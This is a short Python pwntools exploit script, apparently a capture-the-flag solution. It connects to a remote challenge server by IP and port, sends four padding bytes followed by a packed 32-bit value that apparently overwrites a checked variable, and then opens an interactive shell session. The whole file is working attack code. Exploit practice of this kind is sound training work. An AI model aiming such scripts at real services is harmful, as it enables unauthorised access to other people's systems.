from pwn import *

#io = process("a")

io = remote("111.200.241.244", 61527)

payload = b'a'*4 + p32(0x6E756161)

io.sendline(payload)

io.interactive()
